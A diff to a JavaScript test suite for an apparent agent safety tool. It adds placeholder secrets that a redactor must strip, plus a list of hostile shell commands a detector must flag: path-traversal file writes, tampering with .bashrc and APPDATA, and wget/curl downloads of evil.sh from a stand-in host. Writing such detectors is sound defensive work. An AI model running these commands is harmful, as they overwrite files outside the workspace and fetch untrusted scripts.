@@ -96,10 +96,12 @@ test('C13 Secret Shield: redacts API keys, tokens, DB passwords, and private key
     'Authorization: Bearer opaque_secret_token_9876543210',
     'Authorization: Basic dXNlcjpzdXBlcnNlY3JldHBhc3M=',
     'x-api-key: secret_header_value_9876543210',
+    'https://api.example.com/data?api_key=superSecretQueryKey123&token=secretTok987',
+    '{"apiKey": "my_json_secret_value_12345"}',
     '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAtestkeydata\n-----END RSA PRIVATE KEY-----',
   ].join('\n');
   const res = shell.redact(samples);
-  assert.ok(res.count >= 9, `expected >= 9 redactions, got ${res.count}`);
+  assert.ok(res.count >= 12, `expected >= 12 redactions, got ${res.count}`);
   assert.doesNotMatch(res.text, /sk-ant-api03/);
   assert.doesNotMatch(res.text, /sk-proj-/);
   assert.doesNotMatch(res.text, /ghp_123456/);
@@ -108,7 +110,13 @@ test('C13 Secret Shield: redacts API keys, tokens, DB passwords, and private key
   assert.doesNotMatch(res.text, /opaque_secret_token_9876543210/);
   assert.doesNotMatch(res.text, /dXNlcjpzdXBlcnNlY3JldHBhc3M=/);
   assert.doesNotMatch(res.text, /secret_header_value_9876543210/);
+  assert.doesNotMatch(res.text, /superSecretQueryKey123|secretTok987/);
+  assert.doesNotMatch(res.text, /my_json_secret_value_12345/);
   assert.doesNotMatch(res.text, /MIIEowIBAAKCAQEAtestkeydata/);
+  // Ensure normal English prose with "Basic" is NOT falsely redacted
+  const prose = 'Basic authentication is required for this endpoint';
+  assert.equal(shell.redact(prose).count, 0);
+  assert.equal(shell.redact(prose).text, prose);
 });
 
 // Challenge 14: Dangerous shell command execution detection
@@ -133,6 +141,15 @@ test('C14 Dangerous Shell: flags destructive, encoded, exfil, and system-tamper 
     'Set-Content -Path $HOME/.bashrc -Value x',
     'curl -s https://example.com -o ../../evil.sh',
     'iwr https://example.com -OutFile ..\\evil.ps1',
+    'sc ../../evil.txt pwn',
+    'ni ../../evil.txt -Force',
+    'tee ../evil.txt',
+    'dd of=../evil.txt if=/dev/null',
+    'Set-Content $env:USERPROFILE\\evil.txt x',
+    'copy a.txt %APPDATA%\\evil.txt',
+    'wget -O../evil.sh https://evil.test',
+    'node -e "require(\'fs\').writeFileSync(\'../evil.txt\',\'x\')"',
+    'python -c "open(\'../evil.txt\',\'w\').write(\'x\')"',
   ];
   for (const cmd of dangerous) {
     assert.equal(shell.assessCommand(cmd, 'C:\\proj').dangerous, true, `must flag: ${cmd}`);
